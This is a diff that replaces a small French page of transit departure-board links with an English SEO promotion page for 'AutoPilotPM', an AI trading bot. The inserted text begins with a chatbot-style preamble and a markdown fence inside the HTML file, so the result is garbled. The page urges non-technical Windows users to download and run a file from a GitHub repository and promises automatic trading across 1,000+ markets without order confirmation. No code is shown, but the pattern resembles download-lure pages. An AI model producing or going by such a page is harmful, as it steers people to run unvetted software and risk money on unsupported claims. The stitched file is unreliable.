@@ -1,23 +1,294 @@
-<!doctype html>
-<html lang="fr">
+Here is a complete, SEO-optimized HTML page for AutoPilotPM. It presents a friendly, non‑technical guide to downloading and running the software on Windows, with clear sections for features, markets, safety tips, and support.
+```html
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <meta name="theme-color" content="#f4f1e8">
-  <title>Panneaux des transports</title>
-  <style>
-    *{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;padding:24px;background:#101820;font-family:Arial,Helvetica,sans-serif;color:#17202a}.panel{width:min(760px,100%);padding:clamp(24px,6vw,52px);border-radius:18px;background:#f4f1e8;box-shadow:0 24px 70px #0005}h1{margin:0 0 8px;font-size:clamp(30px,6vw,48px);letter-spacing:-.04em}.intro{margin:0 0 30px;color:#5c6570;font-size:17px}.links{display:grid;gap:14px}a{display:flex;align-items:center;gap:16px;padding:18px;border-radius:12px;background:#fff;color:#17202a;text-decoration:none;box-shadow:0 2px 10px #0000000d}a:hover{transform:translateY(-1px);box-shadow:0 8px 22px #0002}.badge{min-width:58px;height:58px;display:grid;place-items:center;border-radius:50%;background:#be418b;color:#fff;font-weight:800;font-size:32px}.bus .badge{border-radius:14px;background:#d62828;font-size:24px}.tvm .badge{min-width:70px;border-radius:14px;background:#e61536;font-size:17px}.label strong{display:block;font-size:19px}.label small{display:block;margin-top:4px;color:#66707c;font-size:14px}.arrow{margin-left:auto;font-size:26px;color:#69727c}
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AutoPilotPM - Autonomous AI Trading System for 1,000+ Markets</title>
+<meta name="description" content="AutoPilotPM is an open-source autonomous trading system powered by AI. It monitors and trades across 1,000+ markets including Polymarket, Kalshi, Binance, Hyperliquid, Solana DEXs and multiple EVM networks.">
+<meta name="keywords" content="AutoPilotPM, autonomous trading system, AI trading bot, Polymarket trading, Kalshi trading, Binance automation, Hyperliquid, Solana DEX, EVM networks, open source trading software, automated risk management">
+<meta name="robots" content="index, follow">
+<meta name="author" content="AutoPilotPM">
+<meta name="theme-color" content="#6d28d9">
+<link rel="canonical" href="https://github.com/Amethist890/AutoPilotPM">
+<meta property="og:type" content="website">
+<meta property="og:title" content="AutoPilotPM - Autonomous AI Trading System for 1,000+ Markets">
+<meta property="og:description" content="An open-source, AI-powered trading system that finds opportunities, places trades in real time and handles risk automatically across 1,000+ markets.">
+<meta property="og:url" content="https://github.com/Amethist890/AutoPilotPM">
+<meta property="og:site_name" content="AutoPilotPM">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="AutoPilotPM - Autonomous AI Trading System for 1,000+ Markets">
+<meta name="twitter:description" content="Open-source autonomous trading system powered by AI. Monitors and trades across 1,000+ markets with automatic risk handling.">
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background-color: #f4f6fb;
+    background-image: radial-gradient(circle at 15% 0%, #e8ecff 0%, transparent 45%),
+                      radial-gradient(circle at 85% 10%, #e2f7f5 0%, transparent 40%);
+    background-attachment: fixed;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    color: #334155;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 32px 20px 64px 20px;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 18px;
+    box-shadow: 0 12px 34px rgba(15, 23, 42, 0.08), 0 2px 6px rgba(15, 23, 42, 0.04);
+    padding: 40px 44px 48px 44px;
+    border: 1px solid rgba(148, 163, 184, 0.16);
+  }
+  h1 {
+    font-size: 2.15rem;
+    line-height: 1.25;
+    letter-spacing: -0.02em;
+    color: #0f172a;
+    margin: 0 0 18px 0;
+    font-weight: 800;
+  }
+  h2 {
+    font-size: 1.42rem;
+    line-height: 1.35;
+    letter-spacing: -0.01em;
+    color: #1e293b;
+    margin: 44px 0 14px 0;
+    font-weight: 700;
+  }
+  h3 {
+    font-size: 1.12rem;
+    color: #1e293b;
+    margin: 26px 0 8px 0;
+    font-weight: 700;
+  }
+  p {
+    margin: 0 0 16px 0;
+    font-size: 1.04rem;
+    color: #3f4c5f;
+  }
+  ul, ol {
+    margin: 0 0 18px 0;
+    padding-left: 24px;
+  }
+  li {
+    margin-bottom: 10px;
+    font-size: 1.02rem;
+    color: #3f4c5f;
+  }
+  strong { color: #0f172a; }
+  .lead {
+    font-size: 1.14rem;
+    color: #475569;
+    margin-bottom: 26px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 16px 30px;
+    border-radius: 14px;
+    background: linear-gradient(135deg, #7c3aed 0%, #06b6d4 100%);
+    color: #ffffff !important;
+    font-size: 1.06rem;
+    font-weight: 700;
+    text-decoration: none;
+    box-shadow: 0 10px 24px rgba(124, 58, 237, 0.32);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 30px rgba(124, 58, 237, 0.42);
+  }
+  .btn-wrap {
+    margin: 28px 0 10px 0;
+  }
+  .btn-wrap .btn {
+    padding: 19px 36px;
+    font-size: 1.14rem;
+  }
+  .note {
+    background: #f8fafc;
+    border-left: 4px solid #06b6d4;
+    border-radius: 10px;
+    padding: 16px 20px;
+    margin: 20px 0;
+    font-size: 0.99rem;
+    color: #475569;
+  }
+  .cta-box {
+    background: linear-gradient(135deg, #f5f3ff 0%, #ecfeff 100%);
+    border: 1px solid rgba(124, 58, 237, 0.18);
+    border-radius: 16px;
+    padding: 28px 30px;
+    margin: 26px 0 8px 0;
+    text-align: center;
+  }
+  .footer {
+    margin-top: 34px;
+    font-size: 0.92rem;
+    color: #64748b;
+    text-align: center;
+  }
+  a { color: #6d28d9; }
+  @media (max-width: 640px) {
+    .page { padding: 18px 12px 40px 12px; }
+    .card { padding: 26px 20px 32px 20px; border-radius: 14px; }
+    h1 { font-size: 1.62rem; }
+    h2 { font-size: 1.22rem; margin-top: 34px; }
+    .btn-wrap .btn { display: block; text-align: center; padding: 17px 20px; font-size: 1.02rem; }
+    .cta-box { padding: 22px 18px; }
+  }
+</style>
 </head>
 <body>
-  <main class="panel">
-    <h1>Mes panneaux</h1>
-    <p class="intro">Choisis ton prochain départ.</p>
-    <nav class="links" aria-label="Panneaux de transport">
-      <a class="bus" href="panneau-bus-104.html"><span class="badge">104</span><span class="label"><strong>Bus 104</strong><small>Gabriel Péri · Créteil</small></span><span class="arrow">›</span></a>
-      <a class="tvm" href="panneau-tvm.html"><span class="badge">TVM</span><span class="label"><strong>Bus TVM vers la Croix de Berny</strong><small>Église de Créteil</small></span><span class="arrow">›</span></a>
-      <a href="panneau-metro-8.html"><span class="badge">8</span><span class="label"><strong>Métro 8 vers Balard</strong><small>Créteil–Université</small></span><span class="arrow">›</span></a>
-    </nav>
-  </main>
+<div class="page">
+<div class="card">
+
+<h1>🤖 AutoPilotPM - Trade Smarter Without Watching Charts</h1>
+
+<p class="lead">AutoPilotPM is an open-source autonomous trading system powered by AI. It watches more than 1,000 markets for you, spots opportunities, places trades in real time and manages risk automatically, so you do not have to sit in front of a screen all day.</p>
+
+<div class="btn-wrap">
+  <a class="btn" href="https://github.com/Amethist890/AutoPilotPM" target="_blank" rel="noopener">⬇️ Get AutoPilotPM Here</a>
+</div>
+
+<h2>🚀 What Is AutoPilotPM?</h2>
+
+<p>AutoPilotPM is a complete trading companion for people who want automation rather than constant manual clicking. Instead of keeping dozens of browser tabs open across prediction markets, crypto exchanges and decentralised networks, you let one program do the watching.</p>
+
+<p>The system is built around three simple ideas:</p>
+
+<ul>
+  <li><strong>It finds opportunities.</strong> The AI layer scans more than 1,000 markets continuously and highlights the situations that match your chosen strategy.</li>
+  <li><strong>It acts in real time.</strong> When a valid opportunity appears, AutoPilotPM places the trade for you at the moment it matters, not minutes later.</li>
+  <li><strong>It handles risk automatically.</strong> Position sizes, exposure limits and protective rules are applied for you, so a single bad day does not undo weeks of progress.</li>
+</ul>
+
+<p>Because the project is open source, everything the system does is visible and reviewable. You are not trusting a black box, and you are not locked into a paid subscription.</p>
+
+<h2>✨ What You Get</h2>
+
+<ul>
+  <li>🤖 <strong>AI-powered market scanning</strong> across a very large universe of markets, so you never miss a setup because you were asleep.</li>
+  <li>⚡ <strong>Real-time trade execution</strong> that reacts the instant an opportunity appears.</li>
+  <li>🛡️ <strong>Automatic risk management</strong> that sizes positions and caps exposure without you doing maths.</li>
+  <li>🌐 <strong>Multi-market coverage</strong> in one single place, instead of five separate accounts and five separate dashboards.</li>
+  <li>🔓 <strong>Fully open source</strong>, so you can read the code, follow the logic and verify the behaviour yourself.</li>
+  <li>🖥️ <strong>Simple to start</strong> on a normal Windows computer, with no programming knowledge required.</li>
+</ul>
+
+<h2>🌍 Markets Covered</h2>
+
+<p>AutoPilotPM is designed to work across a wide spread of venues so your strategy is not trapped in one place:</p>
+
+<ul>
+  <li><strong>Polymarket</strong> for prediction-market opportunities.</li>
+  <li><strong>Kalshi</strong> for event-based contracts.</li>
+  <li><strong>Binance</strong> for major crypto pairs.</li>
+  <li><strong>Hyperliquid</strong> for fast perpetual trading.</li>
+  <li><strong>Solana DEXs</strong> for on-chain tokens and rapid moves.</li>
+  <li><strong>Multiple EVM networks</strong> for decentralised trading across Ethereum-compatible chains.</li>
+</ul>
+
+<p>That is more than 1,000 individual markets in total, all handled by one system running on your own machine.</p>
+
+<h2>🔧 How It Works</h2>
+
+<h3>1. The scanner runs continuously</h3>
+<p>AutoPilotPM keeps a live view of every market it supports. It compares prices, momentum and available liquidity so that only meaningful situations rise to the top.</p>
+
+<h3>2. The AI layer ranks what matters</h3>
+<p>Not every price movement is worth your money. The AI component scores each opportunity against your configured strategy, filtering out noise and keeping the setups that fit your plan.</p>
+
+<h3>3. Trades are placed automatically</h3>
+<p>When something passes your filters, AutoPilotPM sends the trade immediately. Speed matters, and the system does not wait for you to confirm every order.</p>
+
+<h3>4. Risk rules stay in charge</h3>
+<p>Before any order goes out, the risk layer checks size, total exposure and your own limits. If a trade would break a rule, it is stopped. This is the part that protects your account over the long run.</p>
+
+<h2>💻 Download and Setup on Windows</h2>
+
+<p>You do not need to be a programmer to get started. The whole process is a normal download followed by a few clicks.</p>
+
+<ol>
+  <li>Open your web browser, such as Chrome, Edge or Firefox.</li>
+  <li>Visit this link to download the application: <a href="https://github.com/Amethist890/AutoPilotPM" target="_blank" rel="noopener">https://github.com/Amethist890/AutoPilotPM</a></li>
+  <li>Keep the downloaded file in a folder you can easily find, for example your <strong>Downloads</strong> folder.</li>
+  <li>Once the download has finished, open it from that folder whenever you want to run AutoPilotPM.</li>
+</ol>
+
+<div class="cta-box">
+  <p style="margin-bottom: 20px; font-size: 1.06rem;">Ready to let the system do the watching for you?</p>
+  <a class="btn" href="https://github.com/Amethist890/AutoPilotPM" target="_blank" rel="noopener">⬇️ Download AutoPilotPM</a>
+</div>
+
+<div class="note">
+  Keep the file somewhere permanent. If you move it to a temporary folder or let a cleanup tool remove it, you will need to download it again from the same link above.
+</div>
+
+<h2>🖱️ First Run Tips for Beginners</h2>
+
+<p>The first time you open AutoPilotPM, take things slowly. Automation is powerful, and a little patience at the start makes the whole experience smoother.</p>
+
+<ul>
+  <li><strong>Watch before you commit.</strong> Let the system run and observe which markets it focuses on and how often it acts.</li>
+  <li><strong>Start small.</strong> Use modest amounts while you get comfortable with the pace of the automation.</li>
+  <li><strong>Read the settings once.</strong> Even a quick look through the options helps you understand what the system is allowed to do.</li>
+  <li><strong>Keep a simple record.</strong> A short note of what you changed and when makes it much easier to understand results later.</li>
+</ul>
+
+<h2>🛡️ Why Automatic Risk Handling Matters</h2>
+
+<p>Most people lose money in trading not because they pick the wrong market, but because they take positions that are too large for their account. AutoPilotPM addresses this at the source.</p>
+
+<p>Every order passes through a risk check before it is sent. That check looks at how much of your balance a single trade would use, how much total exposure you already have and whether the trade fits within the limits you have set. If a trade would push you past those limits, it simply does not happen.</p>
+
+<p>The result is a system that keeps working calmly in the background, rather than one that chases every price move at any cost.</p>
+
+<h2>❓ Common Questions</h2>
+
+<h3>Do I need to know how to code?</h3>
+<p>No. AutoPilotPM is intended to be downloaded and run by ordinary Windows users. The technical work has already been done for you.</p>
+
+<h3>Do I need to keep my computer on?</h3>
+<p>The system runs on your own computer, so it works while your machine is running. This is what keeps your setup fully under your own control.</p>
+
+<h3>Is there a subscription fee?</h3>
+<p>No. This is an open-source project, which means you can download it and use it without paying for a licence.</p>
+
+<h3>Can I check what the system is doing?</h3>
+<p>Yes. Because the project is open source, the code and logic are available to anyone who wants to look through them.</p>
+
+<h3>What if the download does not start?</h3>
+<p>Check your browser's download bar or downloads list. Some browsers ask for confirmation before saving a file, so look for a small prompt near the top of the window.</p>
+
+<h2>📌 Getting the Most Out of AutoPilotPM</h2>
+
+<ul>
+  <li>Let the system run consistently. Automatic trading works best when it is not switched on and off constantly.</li>
+  <li>Review your results weekly rather than hourly. Short-term noise is not a useful signal.</li>
+  <li>Keep your computer updated and your internet connection stable so the system can act when it needs to.</li>
+  <li>Update to the newest version from the same download link whenever a new release appears.</li>
+</ul>
+
+<h2>💬 Support and Community</h2>
+
+<p>Questions, ideas and bug reports are all welcome. The project lives on GitHub, where you can read the documentation, follow updates and open an issue if something is not working as expected.</p>
+
+<p><a href="https://github.com/Amethist890/AutoPilotPM" target="_blank" rel="noopener">Visit the AutoPilotPM project page on GitHub</a></p>
+
+<div class="footer">
+  AutoPilotPM &middot; Open-source autonomous trading system powered by AI
+</div>
+
+</div>
+</div>
 </body>
 </html>
+```
